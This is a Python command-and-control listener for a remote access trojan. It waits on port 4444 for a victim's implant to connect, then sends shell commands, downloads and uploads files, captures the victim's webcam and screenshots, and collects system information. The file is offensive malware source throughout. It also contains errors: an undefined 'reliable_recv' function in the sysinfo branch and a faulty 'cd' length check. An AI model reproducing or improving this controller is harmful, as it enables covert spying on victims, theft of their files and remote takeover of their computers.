import socket 
import json
import base64

def server(ip, port):
    global target

    lisetner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    lisetner.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    lisetner.bind((ip, port))
    lisetner.listen(0)
    print('[+] Listening....')
    target, address = lisetner.accept()
    print(f"[+] Got connection from {address}")

def send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode('utf-8'))

def receive():
    json_data = '' 
    while True:
        try:
            json_data += target.recv(1024).decode('utf-8')
            return json.loads(json_data)
        except ValueError:
            continue

def run():
    while True:
        command = input('Shell#: ')
        send(command)
        if command == 'exit':
            break
        elif command[:2] == 'cd' and len(command) > 1:
            continue
        elif command [:8] == 'download':
            with open(command[9:], 'wb') as f:
                file_data = receive()
                f.write(base64.b64decode(file_data))
        elif command[:6] == 'upload':
            with open(command[7:], 'rb') as f:
                send(base64.b64encode(f.read()))
        elif command == 'camera':
            image_data = receive()
            try:
                with open("camera_image.png", "wb") as img:
                    img.write(base64.b64decode(image_data + '=' * (-len(image_data) % 4)))  # fix padding
                print("[+] Image saved as camera_image.png")
            except Exception as e:
                print("[!] Failed to save image:", e)
        elif command == 'screenshot':
            image = receive()
            try:
                with open('screenshot.png', 'wb') as img:
                    img.write(base64.b64decode(image))
                print("[+] Screenshot saved as 'screenshot.png'")
            except Exception as e:
                print(f"[-] Failed to save screenshot: {e}")
        elif command == "sysinfo":
            try:
                info = reliable_recv()
                print("[*] System Information:")
                print(info)
            except Exception as e:
                result = reliable_recv()
                print(result)
        else:
            result = receive().encode('utf-8')
            print(result.decode('utf-8'))

server('192.168.29.219', 4444) # use your ip address
run()
